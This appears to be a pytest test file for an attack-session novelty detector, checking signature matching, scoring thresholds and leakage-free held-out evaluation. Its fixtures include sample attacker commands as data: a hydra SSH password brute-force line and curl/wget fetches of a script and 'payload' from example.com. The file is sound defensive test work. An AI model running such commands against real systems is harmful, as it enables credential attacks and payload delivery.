import json
import math
from pathlib import Path

import pandas as pd
import pytest

from scripts.novelty_assessment import (
    NoveltyAssessmentError,
    assess_session_against_signatures,
    assess_sessions,
    create_session_split,
    generate_novelty_assessment,
    load_signature_catalog,
    run_held_out_evaluation,
    write_assessment_outputs,
)


@pytest.fixture
def synthetic_signatures():
    return [
        {
            "signature_id": "sig-known",
            "behaviour_label": "Credential-attack behaviour",
            "feature_profile": {
                "selected_features": [
                    {"feature": "dur", "mean": 5.0, "median": 5.0, "std": 1.0, "min": 3.0, "max": 7.0},
                    {"feature": "dbytes", "mean": 10.0, "median": 10.0, "std": 2.0, "min": 5.0, "max": 20.0},
                    {"feature": "spkts", "mean": 2.0, "median": 2.0, "std": 1.0, "min": 1.0, "max": 4.0},
                ]
            },
            "command_categories": ["credential_attack", "file_system"],
            "authentication_profile": {"success_rate": 0.0},
        },
        {
            "signature_id": "sig-alt",
            "behaviour_label": "Mixed/Unclassified",
            "feature_profile": {
                "selected_features": [
                    {"feature": "dur", "mean": 8.0, "median": 8.0, "std": 1.0, "min": 7.0, "max": 10.0},
                    {"feature": "dbytes", "mean": 50.0, "median": 50.0, "std": 2.0, "min": 40.0, "max": 60.0},
                    {"feature": "spkts", "mean": 4.0, "median": 4.0, "std": 1.0, "min": 3.0, "max": 5.0},
                ]
            },
            "command_categories": ["reconnaissance", "networking"],
            "authentication_profile": {"success_rate": 100.0},
        },
    ]


@pytest.fixture
def synthetic_session_records():
    return {
        "s_known": {
            "session_id": "s_known",
            "features": {"dur": 5.2, "dbytes": 11.0, "spkts": 2.2, "ct_state_ttl": 1.0},
            "commands": ["hydra -l root -P pass.txt ssh://host", "ls -la"],
            "auth_success": 0,
        },
        "s_novel": {
            "session_id": "s_novel",
            "features": {"dur": 100.0, "dbytes": 1000.0, "spkts": 10.0, "ct_state_ttl": 5.0},
            "commands": ["curl https://example.com/file.sh"],
            "auth_success": 1,
        },
        "s_missing": {
            "session_id": "s_missing",
            "features": {},
            "commands": [],
            "auth_success": None,
        },
        "s_ambiguous": {
            "session_id": "s_ambiguous",
            "features": {"dur": 8.5, "dbytes": 60.0, "spkts": 4.0},
            "commands": ["whoami", "wget http://example.com/payload"],
            "auth_success": 1,
        },
    }


def test_matching_session_to_known_signature(synthetic_signatures, synthetic_session_records):
    result = assess_session_against_signatures(synthetic_session_records["s_known"], synthetic_signatures)
    assert result["assessment_category"] == "Known-like"
    assert result["closest_signature_id"] == "sig-known"
    assert result["score"] >= 0.70
    details = result["comparable_feature_count"]
    assert details == 3


def test_detecting_potentially_novel_pattern(synthetic_signatures, synthetic_session_records):
    result = assess_session_against_signatures(synthetic_session_records["s_novel"], synthetic_signatures)
    assert result["assessment_category"] in {"Potentially Novel", "Insufficient Evidence"}
    assert result["closest_signature_id"] in {"sig-known", "sig-alt"}


def test_meaningfully_different_numerical_features_are_not_known_like(synthetic_signatures):
    session = {
        "session_id": "s-numeric-novel",
        "features": {"dur": 1000.0, "dbytes": 10000.0, "spkts": 200.0},
        "commands": ["hydra -l root -P pass.txt ssh://host", "ls -la"],
        "auth_success": 0,
    }
    result = assess_session_against_signatures(session, synthetic_signatures[:1])
    assert result["assessment_category"] == "Potentially Novel"
    assert result["score"] < 0.70


def test_conflicting_equal_matches_are_ambiguous(synthetic_signatures):
    duplicate_signatures = [
        {**synthetic_signatures[0], "signature_id": "sig-a"},
        {**synthetic_signatures[0], "signature_id": "sig-b"},
    ]
    session = {
        "session_id": "s-tied",
        "features": {"dur": 5.0, "dbytes": 10.0, "spkts": 2.0},
        "commands": ["hydra -l root -P pass.txt ssh://host", "ls -la"],
        "auth_success": 0,
    }
    result = assess_session_against_signatures(session, duplicate_signatures)
    assert result["assessment_category"] == "Ambiguous"
    assert result["score"] >= 0.70
    assert result["second_score"] == result["score"]


def test_insufficient_and_missing_evidence(synthetic_signatures):
    missing = {"session_id": "m1", "features": {}, "commands": [], "auth_success": None}
    result = assess_session_against_signatures(missing, synthetic_signatures)
    assert result["assessment_category"] == "Insufficient Evidence"

    no_sigs = assess_session_against_signatures(missing, [])
    assert no_sigs["assessment_category"] == "Insufficient Evidence"


def test_ambiguous_or_borderline_matches(synthetic_signatures, synthetic_session_records):
    sigs = [
        {**synthetic_signatures[0], "signature_id": "sig-a", "feature_profile": {"selected_features": [{"feature": "dur", "mean": 8.0, "median": 8.0, "std": 0.1, "min": 7.9, "max": 8.1}, {"feature": "dbytes", "mean": 50.0, "median": 50.0, "std": 0.1, "min": 49.9, "max": 50.1}, {"feature": "spkts", "mean": 4.0, "median": 4.0, "std": 0.1, "min": 3.9, "max": 4.1}]}, "command_categories": ["reconnaissance"]},
        {**synthetic_signatures[1], "signature_id": "sig-b", "feature_profile": {"selected_features": [{"feature": "dur", "mean": 8.1, "median": 8.1, "std": 0.1, "min": 8.0, "max": 8.2}, {"feature": "dbytes", "mean": 51.0, "median": 51.0, "std": 0.1, "min": 50.9, "max": 51.1}, {"feature": "spkts", "mean": 4.1, "median": 4.1, "std": 0.1, "min": 4.0, "max": 4.2}]}, "command_categories": ["networking"]},
    ]
    result = assess_session_against_signatures(synthetic_session_records["s_ambiguous"], sigs)
    assert result["assessment_category"] in {"Ambiguous", "Known-like", "Potentially Novel"}


def test_missing_or_malformed_signature_files(tmp_path):
    missing_path = tmp_path / "missing.json"
    with pytest.raises(NoveltyAssessmentError):
        load_signature_catalog(missing_path)

    malformed_path = tmp_path / "bad.json"
    malformed_path.write_text("{not valid json}", encoding="utf-8")
    with pytest.raises(NoveltyAssessmentError):
        load_signature_catalog(malformed_path)

    merely_bad = tmp_path / "bad_payload.json"
    merely_bad.write_text(json.dumps({"not_signatures": []}), encoding="utf-8")
    with pytest.raises(NoveltyAssessmentError):
        load_signature_catalog(merely_bad)


def test_incompatible_feature_schemas_and_non_finite_values():
    session = {
        "session_id": "s_bad",
        "features": {"dur": float("nan"), "dbytes": float("inf"), "spkts": 2.0},
        "commands": ["ls"],
        "auth_success": 0,
    }
    signature = {
        "signature_id": "sig-x",
        "behaviour_label": "Known-like",
        "feature_profile": {"selected_features": [{"feature": "dur", "mean": 5.0, "median": 5.0, "std": 1.0, "min": 3.0, "max": 7.0}]},
        "command_categories": ["file_system"],
        "authentication_profile": {"success_rate": 0.0},
    }
    result = assess_session_against_signatures(session, [signature])
    assert result["assessment_category"] in {"Insufficient Evidence", "Potentially Novel"}


def test_threshold_configuration(synthetic_signatures, synthetic_session_records):
    base = synthetic_session_records["s_known"]
    result = assess_session_against_signatures(base, synthetic_signatures, known_threshold=0.95)
    assert result["assessment_category"] in {"Potentially Novel", "Insufficient Evidence"}
    too_many_features = assess_session_against_signatures(
        base,
        synthetic_signatures,
        min_compatible_features=4,
    )
    assert too_many_features["assessment_category"] == "Insufficient Evidence"


def test_command_contradiction_prevents_numerical_score_from_masking_conflict(synthetic_signatures):
    session = {
        "session_id": "s-command-conflict",
        "features": {"dur": 5.0, "dbytes": 10.0, "spkts": 2.0},
        "commands": ["whoami", "uname -a"],
        "auth_success": 0,
    }
    result = assess_session_against_signatures(session, synthetic_signatures[:1])
    assert result["score"] >= 0.70
    assert result["assessment_category"] == "Potentially Novel"
    assert "command_categories" in result["contradictory_evidence"]


def test_authentication_contradiction_prevents_known_like_classification(synthetic_signatures):
    session = {
        "session_id": "s-auth-conflict",
        "features": {"dur": 5.0, "dbytes": 10.0, "spkts": 2.0},
        "commands": ["hydra -l root -P pass.txt ssh://host", "ls -la"],
        "auth_success": 1,
    }
    result = assess_session_against_signatures(session, synthetic_signatures[:1])
    assert result["score"] >= 0.70
    assert result["assessment_category"] == "Potentially Novel"
    assert "authentication" in result["contradictory_evidence"]


def test_deterministic_results(synthetic_signatures, synthetic_session_records):
    first = assess_sessions(synthetic_session_records, synthetic_signatures)
    second = assess_sessions(synthetic_session_records, synthetic_signatures)
    assert first == second


def test_held_out_split_and_session_leakage_protection():
    records = {
        "s1": {"session_id": "s1", "features": {"dur": 1.0, "dbytes": 10.0, "spkts": 1.0}, "commands": ["ls"], "auth_success": 0},
        "s2": {"session_id": "s2", "features": {"dur": 2.0, "dbytes": 20.0, "spkts": 2.0}, "commands": ["whoami"], "auth_success": 1},
        "s3": {"session_id": "s3", "features": {"dur": 3.0, "dbytes": 30.0, "spkts": 3.0}, "commands": ["uname -a"], "auth_success": 1},
    }
    split = create_session_split(records, held_out_ratio=0.33, random_seed=42)
    assert set(split["reference_sessions"]).isdisjoint(split["held_out_sessions"])
    assert len(split["reference_sessions"]) + len(split["held_out_sessions"]) == len(records)


def _write_holdout_fixture(tmp_path, suffix=""):
    session_ids = [f"session-{index}" for index in range(10)]
    dec_rows = []
    details = {}
    for index, session_id in enumerate(session_ids):
        value = float(index + 1)
        dec_rows.append({
            "session_id": session_id,
            "dur": value,
            "dbytes": value * 10,
            "spkts": value + 1,
            "attack_cat": "not-used-as-label",
            "label": 0,
            "dec_cluster": 0,
            "dec_confidence": 0.9,
            "cluster_0_prob": 0.9,
        })
        details[session_id] = {
            "auth_success": index % 2,
            "commands": ["whoami" if index % 2 else "ls -la"],
            "features": {
                "dur": value,
                "dbytes": value * 10,
                "spkts": value + 1,
                "attack_cat": "not-used-as-label",
                "label": 0,
            },
        }
    dec_path = tmp_path / f"dec_results{suffix}.csv"
    details_path = tmp_path / f"session_details{suffix}.json"
    pd.DataFrame(dec_rows).to_csv(dec_path, index=False)
    details_path.write_text(json.dumps(details), encoding="utf-8")
    return dec_path, details_path, session_ids


def test_held_out_evaluation_builds_signatures_from_reference_only(tmp_path):
    dec_path, details_path, _ = _write_holdout_fixture(tmp_path)
    output_dir = tmp_path / "held-out"
    summary = run_held_out_evaluation(
        dec_path,
        details_path,
        output_dir,
        held_out_ratio=0.3,
        random_seed=19,
    )

    manifest = json.loads((output_dir / "session_split.json").read_text(encoding="utf-8"))
    signature_payload = json.loads(
        (output_dir / "reference_signatures" / "behaviour_signatures.json").read_text(encoding="utf-8")
    )
    def reject_nonstandard_json_constant(value):
        raise ValueError(f"Invalid JSON number: {value}")

    json.loads(
        (output_dir / "reference_signatures" / "behaviour_signatures.json").read_text(encoding="utf-8"),
        parse_constant=reject_nonstandard_json_constant,
    )
    assert set(manifest["reference_session_ids"]).isdisjoint(manifest["held_out_session_ids"])
    assert len(manifest["reference_session_ids"]) == summary["reference_session_count"]
    assert len(manifest["held_out_session_ids"]) == summary["held_out_session_count"]
    assert manifest["overlap_session_ids"] == []
    assert summary["evaluation_mode"] == "held-out-reference-signatures"
    assert summary["processed_session_count"] == summary["held_out_session_count"]
    assert summary["signature_count"] == len(signature_payload["signatures"])

    reference_ids = set(manifest["reference_session_ids"])
    held_out_ids = set(manifest["held_out_session_ids"])
    assert reference_ids.isdisjoint(held_out_ids)
    for signature in signature_payload["signatures"]:
        support_ids = set(signature["activity_profile"]["session_ids"])
        assert support_ids
        assert support_ids <= reference_ids
        assert support_ids.isdisjoint(held_out_ids)
        assert signature["source_files"] == [
            f"{dec_path} (reference rows only)",
            f"{details_path} (reference session IDs only)",
        ]
    report = (output_dir / "novelty_assessment_report.md").read_text(encoding="utf-8")
    assert "No attack labels or ground-truth novelty labels were used" in report
    assert "Split seed: 19" in report
    assert "0.70 * feature similarity + 0.20 * command Jaccard similarity + 0.10 * authentication similarity" in report


def test_held_out_signatures_and_results_are_reproducible(tmp_path):
    dec_path, details_path, _ = _write_holdout_fixture(tmp_path)
    first = run_held_out_evaluation(
        dec_path, details_path, tmp_path / "first", held_out_ratio=0.3, random_seed=23
    )
    second = run_held_out_evaluation(
        dec_path, details_path, tmp_path / "second", held_out_ratio=0.3, random_seed=23
    )

    first_manifest = json.loads((tmp_path / "first" / "session_split.json").read_text(encoding="utf-8"))
    second_manifest = json.loads((tmp_path / "second" / "session_split.json").read_text(encoding="utf-8"))
    first_sigs = json.loads((tmp_path / "first" / "reference_signatures" / "behaviour_signatures.json").read_text(encoding="utf-8"))["signatures"]
    second_sigs = json.loads((tmp_path / "second" / "reference_signatures" / "behaviour_signatures.json").read_text(encoding="utf-8"))["signatures"]
    first_results = json.loads((tmp_path / "first" / "novelty_assessment_results.json").read_text(encoding="utf-8"))["results"]
    second_results = json.loads((tmp_path / "second" / "novelty_assessment_results.json").read_text(encoding="utf-8"))["results"]

    assert first_manifest["reference_session_ids"] == second_manifest["reference_session_ids"]
    assert first_manifest["held_out_session_ids"] == second_manifest["held_out_session_ids"]
    assert [(item["signature_id"], item["activity_profile"]["session_ids"]) for item in first_sigs] == [
        (item["signature_id"], item["activity_profile"]["session_ids"]) for item in second_sigs
    ]
    assert first_results == second_results
    assert first["category_counts"] == second["category_counts"]


def test_held_out_values_do_not_change_reference_signatures(tmp_path):
    dec_path, details_path, session_ids = _write_holdout_fixture(tmp_path)
    baseline_dir = tmp_path / "baseline"
    baseline = run_held_out_evaluation(
        dec_path, details_path, baseline_dir, held_out_ratio=0.3, random_seed=31
    )
    manifest = json.loads((baseline_dir / "session_split.json").read_text(encoding="utf-8"))

    changed = pd.read_csv(dec_path)
    held_out_mask = changed["session_id"].isin(manifest["held_out_session_ids"])
    changed.loc[held_out_mask, "dur"] = 100000.0
    changed.loc[held_out_mask, "dbytes"] = 1000000.0
    changed_path = tmp_path / "dec_results_changed.csv"
    changed.to_csv(changed_path, index=False)
    changed_dir = tmp_path / "changed"
    rerun = run_held_out_evaluation(
        changed_path, details_path, changed_dir, held_out_ratio=0.3, random_seed=31
    )

    baseline_signatures = json.loads(
        (baseline_dir / "reference_signatures" / "behaviour_signatures.json").read_text(encoding="utf-8")
    )["signatures"]
    changed_signatures = json.loads(
        (changed_dir / "reference_signatures" / "behaviour_signatures.json").read_text(encoding="utf-8")
    )["signatures"]
    assert baseline["reference_session_count"] == rerun["reference_session_count"]
    assert [(item["signature_id"], item["feature_profile"]) for item in baseline_signatures] == [
        (item["signature_id"], item["feature_profile"]) for item in changed_signatures
    ]


def test_held_out_evaluation_excludes_malformed_session_records(tmp_path):
    dec_path, details_path, _ = _write_holdout_fixture(tmp_path)
    dec = pd.read_csv(dec_path)
    dec.loc[len(dec)] = {
        "session_id": "malformed-session",
        "dur": 1,
        "dbytes": 10,
        "spkts": 2,
        "attack_cat": "ignored",
        "label": 0,
        "dec_cluster": 0,
        "dec_confidence": 0.9,
        "cluster_0_prob": 0.9,
    }
    dec.to_csv(dec_path, index=False)
    details = json.loads(details_path.read_text(encoding="utf-8"))
    details["malformed-session"] = "not an object"
    details_path.write_text(json.dumps(details), encoding="utf-8")

    summary = run_held_out_evaluation(
        dec_path, details_path, tmp_path / "malformed", held_out_ratio=0.3, random_seed=19
    )
    assert summary["excluded_malformed_details_count"] == 1
    assert summary["eligible_session_count"] == 10
    assert any("malformed non-object" in warning for warning in summary["warnings"])


def test_old_subset_only_holdout_mode_is_rejected(tmp_path, synthetic_signatures):
    session_path = tmp_path / "sessions.json"
    session_path.write_text(json.dumps({"s1": {"session_id": "s1", "features": {}}}), encoding="utf-8")
    with pytest.raises(NoveltyAssessmentError, match="can leak evaluation sessions"):
        generate_novelty_assessment(
            session_details_path=session_path,
            signature_path=tmp_path / "unused.json",
            output_dir=tmp_path / "output",
            held_out_ratio=0.2,
        )


def test_output_json_and_csv_consistency(tmp_path):
    rows = [{
        "session_id": "s1",
        "assessment_category": "Known-like",
        "closest_signature_id": "sig-known",
        "score": 0.82,
        "distance": 0.18,
        "evidence": "example evidence",
        "reason": "known match",
        "best_signature_label": "Credential-attack behaviour",
        "second_score": 0.75,
        "comparable_feature_count": 3,
    }]
    summary = write_assessment_outputs(rows, tmp_path / "novelty_out")
    assert (tmp_path / "novelty_out" / "novelty_assessment_results.csv").exists()
    assert (tmp_path / "novelty_out" / "novelty_assessment_results.json").exists()
    csv_df = pd.read_csv(tmp_path / "novelty_out" / "novelty_assessment_results.csv")
    assert csv_df.iloc[0]["session_id"] == "s1"
    json_payload = json.loads((tmp_path / "novelty_out" / "novelty_assessment_results.json").read_text(encoding="utf-8"))
    assert json_payload["results"][0]["session_id"] == "s1"
    assert summary["results_count"] == 1


def test_empty_input_handling(tmp_path):
    summary = generate_novelty_assessment(
        session_details_path=tmp_path / "empty.json",
        signature_path=tmp_path / "empty_signatures.json",
        output_dir=tmp_path / "empty_out",
    )
    assert summary["status"] == "success"
    assert summary["processed_session_count"] == 0


def test_actual_dataset_and_real_signature_file(tmp_path):
    repo_root = Path(__file__).resolve().parents[1]
    summary = generate_novelty_assessment(
        session_details_path=repo_root / "data/parsed/session_details.json",
        signature_path=repo_root / "reports/behaviour_signatures/behaviour_signatures.json",
        output_dir=tmp_path / "novelty_assessment",
    )
    assert summary["status"] == "success"
    assert summary["input_session_count"] > 0
    assert summary["processed_session_count"] == summary["input_session_count"]


def _write_catalog(path, signatures):
    path.write_text(json.dumps({"signatures": signatures}), encoding="utf-8")


def _with_reference_ids(signatures, ids_per_signature):
    out = []
    for signature, ids in zip(signatures, ids_per_signature):
        item = dict(signature)
        item["activity_profile"] = {"session_ids": ids}
        out.append(item)
    return out


def _write_sessions(path, records):
    path.write_text(json.dumps(records), encoding="utf-8")


def test_evaluation_mode_independent_when_no_session_overlaps_catalogue(tmp_path, synthetic_signatures, synthetic_session_records):
    _write_catalog(tmp_path / "sigs.json", _with_reference_ids(synthetic_signatures, [["ref-1"], ["ref-2"]]))
    _write_sessions(tmp_path / "sessions.json", synthetic_session_records)
    summary = generate_novelty_assessment(tmp_path / "sessions.json", tmp_path / "sigs.json", tmp_path / "out")
    assert summary["evaluation_mode"] == "independent"
    assert summary["overlapping_session_count"] == 0
    assert summary["overlapping_session_ids"] == []
    assert summary["reference_session_id_count"] == 2
    assert not any("in-sample" in warning for warning in summary["warnings"])
    saved = json.loads((tmp_path / "out" / "novelty_assessment_summary.json").read_text(encoding="utf-8"))
    assert saved["evaluation_mode"] == "independent"


def test_evaluation_mode_overlapping_when_a_session_built_the_catalogue(tmp_path, synthetic_signatures, synthetic_session_records):
    _write_catalog(tmp_path / "sigs.json", _with_reference_ids(synthetic_signatures, [["s_known", "ref-1"], ["ref-2"]]))
    _write_sessions(tmp_path / "sessions.json", synthetic_session_records)
    summary = generate_novelty_assessment(tmp_path / "sessions.json", tmp_path / "sigs.json", tmp_path / "out")
    assert summary["evaluation_mode"] == "overlapping"
    assert summary["overlapping_session_ids"] == ["s_known"]
    assert any("in-sample" in warning for warning in summary["warnings"])


def test_overlap_uses_exact_session_id_strings(tmp_path, synthetic_signatures):
    _write_catalog(tmp_path / "sigs.json", _with_reference_ids(synthetic_signatures, [["0123"], [" abc"]]))
    _write_sessions(tmp_path / "sessions.json", {
        "123": {"features": {"dur": 5.0}, "commands": [], "auth_success": 0},
        "abc": {"features": {"dur": 5.0}, "commands": [], "auth_success": 0},
    })
    summary = generate_novelty_assessment(tmp_path / "sessions.json", tmp_path / "sigs.json", tmp_path / "out")
    assert summary["evaluation_mode"] == "independent"


def test_evaluation_mode_unknown_when_catalogue_lacks_session_ids(tmp_path, synthetic_signatures, synthetic_session_records):
    _write_catalog(tmp_path / "sigs.json", synthetic_signatures)
    _write_sessions(tmp_path / "sessions.json", synthetic_session_records)
    summary = generate_novelty_assessment(tmp_path / "sessions.json", tmp_path / "sigs.json", tmp_path / "out")
    assert summary["evaluation_mode"] == "reference-provenance-unknown"
    assert summary["overlapping_session_count"] is None
    assert any("could not be verified" in warning for warning in summary["warnings"])


def test_empty_input_is_not_labelled_in_sample(tmp_path):
    summary = generate_novelty_assessment(tmp_path / "missing.json", tmp_path / "sigs.json", tmp_path / "out")
    assert summary["evaluation_mode"] == "no-sessions"


REVISED_CATALOG = Path(__file__).resolve().parents[1] / "reports/novelty_assessment/held_out/revised/reference_signatures/behaviour_signatures.json"
DEMO_DETAILS = Path(__file__).resolve().parents[1] / "data/demo_20261019_213439/parsed/session_details.json"


@pytest.mark.skipif(not (REVISED_CATALOG.is_file() and DEMO_DETAILS.is_file()), reason="local catalogue/demo data not present")
def test_real_demo_sessions_are_independent_of_reference_catalogue(tmp_path):
    summary = generate_novelty_assessment(DEMO_DETAILS, REVISED_CATALOG, tmp_path / "out")
    assert summary["evaluation_mode"] == "independent"
    assert summary["processed_session_count"] == 8


@pytest.mark.skipif(not REVISED_CATALOG.is_file(), reason="local catalogue not present")
def test_real_catalogue_session_is_reported_as_overlapping(tmp_path):
    catalog = json.loads(REVISED_CATALOG.read_text(encoding="utf-8"))
    reference_id = catalog["signatures"][1]["activity_profile"]["session_ids"][0]
    _write_sessions(tmp_path / "sessions.json", {
        reference_id: {"features": {"dur": 5.0}, "commands": ["whoami"], "auth_success": 1},
        "fresh-session-x": {"features": {"dur": 5.0}, "commands": ["whoami"], "auth_success": 1},
    })
    summary = generate_novelty_assessment(tmp_path / "sessions.json", REVISED_CATALOG, tmp_path / "out")
    assert summary["evaluation_mode"] == "overlapping"
    assert summary["overlapping_session_ids"] == [reference_id]


def _report(tmp_path):
    return (tmp_path / "out" / "novelty_assessment_report.md").read_text(encoding="utf-8")


def test_markdown_report_states_independent_mode_and_counts(tmp_path, synthetic_signatures, synthetic_session_records):
    _write_catalog(tmp_path / "sigs.json", _with_reference_ids(synthetic_signatures, [["ref-1"], ["ref-2"]]))
    _write_sessions(tmp_path / "sessions.json", synthetic_session_records)
    summary = generate_novelty_assessment(tmp_path / "sessions.json", tmp_path / "sigs.json", tmp_path / "out")
    report = _report(tmp_path)
    assert f"- Evaluation mode: {summary['evaluation_mode']}" in report
    assert "- Reference catalogue session IDs: 2" in report
    assert "- Assessed sessions overlapping the reference catalogue: 0" in report
    assert "Overlapping session IDs" not in report


def test_markdown_report_lists_overlapping_sessions_and_warning(tmp_path, synthetic_signatures, synthetic_session_records):
    _write_catalog(tmp_path / "sigs.json", _with_reference_ids(synthetic_signatures, [["s_known", "ref-1"], ["ref-2"]]))
    _write_sessions(tmp_path / "sessions.json", synthetic_session_records)
    summary = generate_novelty_assessment(tmp_path / "sessions.json", tmp_path / "sigs.json", tmp_path / "out")
    report = _report(tmp_path)
    assert "- Evaluation mode: overlapping" in report
    assert "- Assessed sessions overlapping the reference catalogue: 1" in report
    assert "- Overlapping session IDs: s_known" in report
    assert f"- Warning: {summary['warnings'][0]}" in report


def test_markdown_report_marks_unknown_provenance(tmp_path, synthetic_signatures, synthetic_session_records):
    _write_catalog(tmp_path / "sigs.json", synthetic_signatures)
    _write_sessions(tmp_path / "sessions.json", synthetic_session_records)
    generate_novelty_assessment(tmp_path / "sessions.json", tmp_path / "sigs.json", tmp_path / "out")
    report = _report(tmp_path)
    assert "- Evaluation mode: reference-provenance-unknown" in report
    assert "- Reference catalogue session IDs: unknown" in report
    assert "- Assessed sessions overlapping the reference catalogue: unknown" in report
